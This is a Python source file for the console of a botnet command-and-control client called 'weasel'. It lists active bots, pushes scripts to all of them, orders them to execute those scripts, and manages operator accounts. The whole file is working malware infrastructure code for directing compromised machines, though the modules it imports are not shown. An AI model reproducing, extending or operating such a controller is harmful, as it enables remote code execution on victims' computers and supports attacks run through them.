#!/usr/bin/env python
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Botnet management client
#
# Author: Dan Garant
# Created: 08/06/12
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import socket, ssl, argparse, cmd, sys, os
import traceback
from ConfigParser import Error as ConfigError
from weasel.shared.config import EngineConfig
from weasel.engine.manager import BotManager
from weasel.shared.parser import BotParser
from weasel.engine.accounts import AccountManager

class WeaselShell(cmd.Cmd):
    """ Command shell used to execute commands against the weasel botnet"""
    
    def __init__(self, config=os.path.join(os.path.dirname(__file__), 'weasel.conf')):
        """ Initializes the command shell
             
        """
        cmd.Cmd.__init__(self)
        self.prompt = "weasel> "
        try:
            self.config = EngineConfig(config)
        except ConfigError, e:
            sys.stderr.write("An error occurred reading the configuration file. "
                            "Verify that the path {0} is valid.\n".format(config))
            raise e
        self.bot_mgr = BotManager(self.config)
        self.act_mgr = AccountManager(self.config)
        self.parser = BotParser()

    def do_ping(self, line):
        """ Send a ping to all bots to update the list of active bots """
        try:
            ping = self.parser.create_ping_stmt() 
            success, failed = self.bot_mgr.send_to_all(ping)
            print("Success {0} Failure {1}".format(success, failed))
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))

    def do_active(self, line):
        """ Display a list of active bots as ip, port tuples"""
        try:
            bot_ips = self.bot_mgr.get_active_bot_ips()
            print(bot_ips)
        except Exception as e:
            traceback.print_exc()
            sys.stderr.write("Error {0}\n".format(e))

    def do_put(self, script):
        """ put <script> 
            Transfers a script to all active bots, 
            overwriting any files with the same name 
            in the bot's drop folder
        """
        try:
            cmd_content = self.parser.create_put_stmt(script)
            success, failed = self.bot_mgr.send_to_active(cmd_content)
            print("Success {0} Failure {1}".format(success, failed))
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))
        
    def emptyline(self):
        pass

    def do_createuser(self, line):
        """ createuser <ip> <password> 
            Add the specified user to the account table
        """
        try:
            ip, junk, password = line.partition(' ')
            success, failed = self.act_mgr.create_new_account(ip, password)
            print("Created user {0}".format(ip))
            print("Success {0} Failure {1}".format(success, failed))
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))
            

    def do_showusers(self, line):
        """ showusers
            Show the ip addresses of all users in the account table
        """
        try:
            ips = self.act_mgr.get_account_ips()
            print(ips)
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))

    def do_dropuser(self, line):
        """ dropuser <ip>
            Delete the user identified by the specified ip 
            address from the account table
        """
        try:
            self.act_mgr.drop_user(line)
            print("Deleted user {0}".format(line))
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))
        
    def do_exec(self, script):
        """ exec <script>
            Executes the script with the given name, 
            assuming the script is present on the bot machine
        """
        try:
            cmd_content = self.parser.create_exec_stmt(script.strip(' "'))
            self.bot_mgr.send_to_active(cmd_content)
        except Exception as e:
            sys.stderr.write("Error {0}\n".format(e))

    def do_EOF(self, line):
        """ Exit the interpreter """
        return True
        
if __name__ == "__main__":
    if len(sys.argv) > 1:
        WeaselShell(config=sys.argv[1]).cmdloop()
    else:
        WeaselShell().cmdloop()
        
